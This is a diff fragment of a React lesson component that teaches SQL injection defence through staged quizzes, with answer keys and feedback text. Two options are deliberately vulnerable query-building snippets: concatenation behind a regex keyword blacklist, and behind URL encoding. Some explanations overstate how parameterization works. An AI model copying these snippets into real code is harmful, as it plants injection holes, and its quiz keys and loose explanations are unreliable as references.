+                      title: 'Option C: Blacklist Keyword Regex Stripping',
+                      code: "const clean = email.replace(/select|or|and|--/gi, '');\nconst sql = \"SELECT * FROM users WHERE email = '\" + clean + \"'\";",
+                    },
+                    {
+                      id: 'encode_uri',
+                      title: 'Option D: URL Component Encoding',
+                      code: "const sql = \"SELECT * FROM users WHERE email = '\" + encodeURIComponent(email) + \"'\";",
+                    },
+                  ].map((option) => (
+                    <label
+                      key={option.id}
+                      style={{
+                        display: 'flex',
+                        alignItems: 'flex-start',
+                        gap: '10px',
+                        padding: '12px',
+                        borderRadius: '8px',
+                        border: secDiagnosticAnswer === option.id ? '2px solid var(--accent-primary)' : '1px solid var(--border-subtle)',
+                        backgroundColor: secDiagnosticAnswer === option.id ? 'rgba(36, 76, 58, 0.04)' : 'var(--bg-surface)',
+                        cursor: secDiagnosticSubmitted ? 'default' : 'pointer',
+                        fontSize: '0.82rem',
+                      }}
+                    >
+                      <input
+                        type="radio"
+                        name="secDiagnosticOption"
+                        checked={secDiagnosticAnswer === option.id}
+                        disabled={secDiagnosticSubmitted}
+                        onChange={() => setSecDiagnosticAnswer(option.id)}
+                        style={{ marginTop: '3px' }}
+                      />
+                      <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                        <span style={{ fontWeight: 700, color: 'var(--text-primary)' }}>{option.title}</span>
+                        <pre style={{ margin: 0, fontFamily: 'var(--font-mono)', fontSize: '0.78rem', color: 'var(--text-secondary)', whiteSpace: 'pre-wrap' }}>
+                          {option.code}
+                        </pre>
+                      </div>
+                    </label>
+                  ))}
+                </div>
+
+                {!secDiagnosticSubmitted ? (
+                  <div>
+                    <button
+                      type="button"
+                      onClick={handleVerifyDiagnostic}
+                      disabled={!secDiagnosticAnswer}
+                      className="btn-primary"
+                      style={{ height: '36px', padding: '0 16px', opacity: secDiagnosticAnswer ? 1 : 0.5 }}
+                    >
+                      Submit Diagnostic Solution
+                    </button>
+                  </div>
+                ) : (
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                    <div
+                      style={{
+                        padding: '12px 14px',
+                        borderRadius: '8px',
+                        backgroundColor: secDiagnosticAnswer === 'prepared_statement' ? 'rgba(22, 163, 74, 0.1)' : 'rgba(239, 68, 68, 0.1)',
+                        border: `1px solid ${secDiagnosticAnswer === 'prepared_statement' ? 'var(--success)' : 'var(--danger)'}`,
+                        fontSize: '0.84rem',
+                        lineHeight: 1.5,
+                      }}
+                    >
+                      <div style={{ fontWeight: 700, color: secDiagnosticAnswer === 'prepared_statement' ? 'var(--success)' : 'var(--danger)', marginBottom: '4px' }}>
+                        {secDiagnosticAnswer === 'prepared_statement' ? '✓ Correct Diagnostic Refactoring' : '✕ Flawed Diagnostic Solution'}
+                      </div>
+                      <div style={{ color: 'var(--text-primary)' }}>
+                        {secDiagnosticAnswer === 'prepared_statement'
+                          ? 'Using query placeholders (?) tells the database driver to transmit the query string and user parameters across separate network frames. The database engine parses the SQL syntax first, and subsequently binds values as strictly literal bytes.'
+                          : 'Ad-hoc character stripping and regex blacklisting are notoriously fragile. Attackers bypass them with alternate SQL delimiters, double-nesting (e.g., sSELECTelect), or character encoding homoglyphs. Prepared statements are mandatory.'}
+                      </div>
+                    </div>
+
+                    {secDiagnosticAnswer !== 'prepared_statement' && (
+                      <div>
+                        <button
+                          type="button"
+                          onClick={() => setSecDiagnosticSubmitted(false)}
+                          className="btn-secondary"
+                          style={{ height: '32px', padding: '0 14px', fontSize: '0.8rem' }}
+                        >
+                          Retry Diagnostic Refactoring
+                        </button>
+                      </div>
+                    )}
+                  </div>
+                )}
               </div>
 
-              {secExecutionLog.length > 0 && (
-                <div style={{ backgroundColor: 'var(--editor-bg)', border: '1px solid var(--border-subtle)', borderRadius: '8px', padding: '14px', display: 'flex', flexDirection: 'column', gap: '6px', fontFamily: 'var(--font-mono)', fontSize: '0.82rem' }}>
-                  {secExecutionLog.map((log, i) => (
-                    <div key={i} style={{ color: log.startsWith('✓') ? 'var(--success)' : 'var(--danger)' }}>
-                      {log}
+              {/* ============================================================== */}
+              {/* STAGE 4: COMPUTER SCIENCE EXPLANATION CHECKPOINT               */}
+              {/* ============================================================== */}
+              <div className="card" style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                    <span
+                      style={{
+                        fontSize: '0.72rem',
+                        fontWeight: 800,
+                        backgroundColor: secExplanationSubmitted && secExplanationAnswer === 'ast_precompile' ? 'var(--success)' : 'var(--accent-primary)',
+                        color: '#FFFFFF',
+                        padding: '2px 8px',
+                        borderRadius: '12px',
+                        letterSpacing: '0.04em',
+                      }}
+                    >
+                      STAGE 4
+                    </span>
+                    <span style={{ fontWeight: 700, fontSize: '0.95rem', color: 'var(--text-primary)' }}>
+                      Computer Science Explanation Checkpoint
+                    </span>
+                  </div>
+                  <span style={{ fontSize: '0.78rem', color: secExplanationSubmitted && secExplanationAnswer === 'ast_precompile' ? 'var(--success)' : 'var(--text-secondary)', fontWeight: 600 }}>
+                    {secExplanationSubmitted && secExplanationAnswer === 'ast_precompile' ? '✓ Stage Verified' : 'Action Required'}
+                  </span>
+                </div>
+
+                <p style={{ fontSize: '0.88rem', color: 'var(--text-secondary)', lineHeight: 1.5 }}>
+                  Why does parameterization fundamentally stop SQL injection attacks, whereas regex-based sanitization and character stripping frequently fail?
+                </p>
+
+                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                  {[
+                    {
+                      id: 'ast_precompile',
+                      text: 'Parameterization separates the syntax compilation phase from data transmission across the wire protocol. The database engine pre-compiles the Abstract Syntax Tree (AST) query plan before variables arrive, guaranteeing that incoming parameters are treated exclusively as literal scalar data.',
+                    },
+                    {
+                      id: 'sha256_hash',
+                      text: 'Parameterization computes a cryptographic SHA-256 hash of the entire request body before sending it to the database table.',
+                    },
+                    {
+                      id: 'tls_in_memory',
+                      text: 'Parameterization activates mutual TLS 1.3 within server memory to encrypt all table column names.',
+                    },
+                    {
+                      id: 'c_transpile',
+                      text: 'Parameterization recompiles JavaScript routes into native C++ binaries that automatically delete quotation marks.',
+                    },
+                  ].map((option) => (
+                    <label
+                      key={option.id}
+                      style={{
+                        display: 'flex',
+                        alignItems: 'flex-start',
+                        gap: '10px',
+                        padding: '12px',
+                        borderRadius: '8px',
+                        border: secExplanationAnswer === option.id ? '2px solid var(--accent-primary)' : '1px solid var(--border-subtle)',
+                        backgroundColor: secExplanationAnswer === option.id ? 'rgba(36, 76, 58, 0.04)' : 'var(--bg-surface)',
+                        cursor: secExplanationSubmitted ? 'default' : 'pointer',
+                        fontSize: '0.85rem',
+                        lineHeight: 1.45,
+                      }}
+                    >
+                      <input
+                        type="radio"
+                        name="secExplanationOption"
+                        checked={secExplanationAnswer === option.id}
+                        disabled={secExplanationSubmitted}
+                        onChange={() => setSecExplanationAnswer(option.id)}
+                        style={{ marginTop: '3px' }}
+                      />
+                      <span>{option.text}</span>
+                    </label>
+                  ))}
+                </div>
+
+                {!secExplanationSubmitted ? (
+                  <div>
+                    <button
+                      type="button"
+                      onClick={handleVerifyExplanation}
+                      disabled={!secExplanationAnswer}
+                      className="btn-primary"
+                      style={{ height: '36px', padding: '0 16px', opacity: secExplanationAnswer ? 1 : 0.5 }}
+                    >
+                      Verify Conceptual Understanding
+                    </button>
+                  </div>
+                ) : (
+                  <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                    <div
+                      style={{
+                        padding: '12px 14px',
+                        borderRadius: '8px',
+                        backgroundColor: secExplanationAnswer === 'ast_precompile' ? 'rgba(22, 163, 74, 0.1)' : 'rgba(239, 68, 68, 0.1)',
+                        border: `1px solid ${secExplanationAnswer === 'ast_precompile' ? 'var(--success)' : 'var(--danger)'}`,
+                        fontSize: '0.84rem',
+                        lineHeight: 1.5,
+                      }}
+                    >
+                      <div style={{ fontWeight: 700, color: secExplanationAnswer === 'ast_precompile' ? 'var(--success)' : 'var(--danger)', marginBottom: '4px' }}>
+                        {secExplanationAnswer === 'ast_precompile' ? '✓ Mastered Conceptual Foundation' : '✕ Incomplete Explanation'}
+                      </div>
+                      <div style={{ color: 'var(--text-primary)' }}>
+                        {secExplanationAnswer === 'ast_precompile'
+                          ? 'This is the core distinction: string sanitizers attempt to guess whether characters are hostile at the application layer. Parameterization enforces compiler-level boundary separation at the database wire protocol layer. Because the execution plan is frozen prior to parameter substitution, data can never become code.'
+                          : 'Hashing, TLS, and transpilation do not alter how the database query compiler interprets incoming tokens. Compiler boundary separation via parameterized ASTs is the only true architectural mitigation.'}
+                      </div>
+                    </div>
+
+                    {secExplanationAnswer !== 'ast_precompile' && (
+                      <div>
+                        <button
+                          type="button"
+                          onClick={() => setSecExplanationSubmitted(false)}
+                          className="btn-secondary"
+                          style={{ height: '32px', padding: '0 14px', fontSize: '0.8rem' }}
+                        >
+                          Retry Explanation Checkpoint
+                        </button>
+                      </div>
+                    )}
+                  </div>
+                )}
+              </div>
+
+              {/* ============================================================== */}
+              {/* STAGE VERIFICATION SUMMARY & SUBMISSION BANNER                 */}
+              {/* ============================================================== */}
+              <div
+                className="card"
+                style={{
+                  backgroundColor: checkedCriteria.every(Boolean) ? 'rgba(22, 163, 74, 0.05)' : 'var(--bg-surface)',
+                  border: `1.5px solid ${checkedCriteria.every(Boolean) ? 'var(--success)' : 'var(--border-subtle)'}`,
+                  display: 'flex',
+                  flexDirection: 'column',
+                  gap: '12px',
+                }}
+              >
+                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '8px' }}>
+                  <div style={{ fontWeight: 800, fontSize: '0.95rem', color: 'var(--text-primary)' }}>
+                    Pedagogical Slice Progress: {checkedCriteria.filter(Boolean).length} / 4 Stages Validated
+                  </div>
+                  <span
+                    style={{
+                      fontSize: '0.78rem',
+                      fontWeight: 700,
+                      padding: '4px 10px',
+                      borderRadius: '12px',
+                      backgroundColor: checkedCriteria.every(Boolean) ? 'var(--success)' : 'var(--border-subtle)',
+                      color: checkedCriteria.every(Boolean) ? '#FFFFFF' : 'var(--text-secondary)',
+                    }}
+                  >
+                    {checkedCriteria.every(Boolean) ? '100% Complete - Ready to Submit' : 'In Progress'}
+                  </span>
+                </div>
+
+                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '8px' }}>
+                  {[
+                    { label: '1. Architectural Prediction', done: secPredictionSubmitted && secPredictionAnswer === 'ast_mutation' },
+                    { label: '2. Pipeline Hardened', done: secSimulationRan && secParamQueries && secOutputEncoding },
+                    { label: '3. Diagnostic Code Fixed', done: secDiagnosticSubmitted && secDiagnosticAnswer === 'prepared_statement' },
+                    { label: '4. Wire-Level AST Explanation', done: secExplanationSubmitted && secExplanationAnswer === 'ast_precompile' },
+                  ].map((stage, i) => (
+                    <div
+                      key={i}
+                      style={{
+                        padding: '8px 12px',
+                        borderRadius: '6px',
+                        backgroundColor: stage.done ? 'rgba(22, 163, 74, 0.1)' : 'var(--bg-canvas)',
+                        border: `1px solid ${stage.done ? 'var(--success)' : 'var(--border-subtle)'}`,
+                        fontSize: '0.8rem',
+                        fontWeight: 600,
+                        color: stage.done ? 'var(--success)' : 'var(--text-secondary)',
+                        display: 'flex',
+                        alignItems: 'center',
+                        gap: '6px',
+                      }}
+                    >
+                      <span>{stage.done ? '✓' : '○'}</span>
+                      <span>{stage.label}</span>
                     </div>
                   ))}
                 </div>
-              )}
+
+                {checkedCriteria.every(Boolean) && (
+                  <div style={{ marginTop: '8px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '10px' }}>
+                    <div style={{ fontSize: '0.82rem', color: 'var(--success)', fontWeight: 600 }}>
+                      All pedagogical requirements satisfied. Click &quot;Submit &amp; Verify Attempt&quot; in the header or below to record to Sovereign DB.
+                    </div>
+                    <button
+                      type="button"
+                      onClick={handleSubmitAttempt}
+                      className="btn-primary"
+                      style={{ height: '36px', padding: '0 18px' }}
+                    >
+                      <ShieldCheck size={16} />
+                      <span>Submit &amp; Verify Attempt</span>
+                    </button>
+                  </div>
+                )}
+              </div>
             </div>
           )}
 
